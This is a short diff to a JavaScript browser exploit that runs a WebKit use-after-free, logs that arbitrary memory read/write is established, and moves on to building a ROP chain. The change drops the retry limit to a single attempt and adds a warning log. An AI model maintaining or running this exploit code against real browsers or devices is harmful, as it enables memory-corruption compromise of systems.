@@ -730,7 +730,7 @@ async function runWebKitUAF(onProgress) {
                 onEvent: (tag, detail) => {
                     log(`${tag}: ${detail}`, tag.includes("FAIL") || tag.includes("THREW") || tag.includes("ERROR") ? "log-err" : "log-info");
                 },
-                maxAttempts: 10,
+                maxAttempts: 1,
                 beforeCriticalLoad: () => {}
             }).then(carrier => {
                 installWindowP(carrier, { promote: true, onEvent: (tag, detail) => {
@@ -738,6 +738,7 @@ async function runWebKitUAF(onProgress) {
                 } });
                 exploitState.p = window.p;
                 log("WebKit arbitrary R/W established!", "log-ok");
+                log("Single-shot exploit mode active: retry loops are disabled to avoid browser memory exhaustion.", "log-warn");
                 onProgress?.("WebKit UAF complete. Building ROP chain...");
                 resolve();
             }).catch(err => {
